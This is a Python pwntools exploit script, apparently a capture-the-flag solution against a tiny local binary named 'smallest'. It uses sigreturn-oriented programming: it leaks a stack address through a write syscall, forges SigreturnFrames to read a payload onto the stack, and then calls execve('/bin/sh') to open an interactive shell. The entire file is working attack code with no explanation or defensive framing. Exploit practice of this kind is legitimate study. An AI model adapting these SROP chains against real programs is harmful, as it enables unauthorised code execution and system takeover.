from pwn import *
from time import sleep

r=process('./smallest')
elf=ELF('smallest')
context.arch="amd64"
sigreturn=p64(0x4000be)+'C0ss4ck'

log.success('SYSCALL:WRITE')
SROP1=p64(0x4000b0)*3
r.send(SROP1)
sleep(0.5)
r.send('\xb3')
leak0=u64(r.recv()[8:16].ljust(8,'\x00'))
log.info('write(1,something,0x400)')
log.warn('leak next_rsi='+str(hex(leak0)))

log.success('SYSCALL:READ')
SROP2=p64(0x4000b0)+'C0ss4ck!'
sFrame=SigreturnFrame()
sFrame.rax=constants.SYS_read
sFrame.rdi=0
sFrame.rsi=leak0
sFrame.rdx=0x400
sFrame.rsp=leak0
sFrame.rip=0x4000be
SROP2+=str(sFrame)
r.send(SROP2)
sleep(0.5)
r.send(sigreturn)
log.info('read(0,stack,0x400)')

log.success('SYSCALL:EXECVE')
SROP4=p64(0x4000b0)+'C0ss4ck?'
sFrame=SigreturnFrame()
sFrame.rax=constants.SYS_execve
sFrame.rdi=leak0+0x120
sFrame.rsi=0x0
sFrame.rdx=0x0
sFrame.rsp=leak0
sFrame.rip=0x4000be
SROP4+=str(sFrame)
SROP4+=(0x120-len(SROP4))*'\x00'
SROP4+='/bin/sh\x00'
r.send(SROP4)
sleep(0.5)
r.send(sigreturn)
log.info("execve('/bin/sh')")

r.interactive()
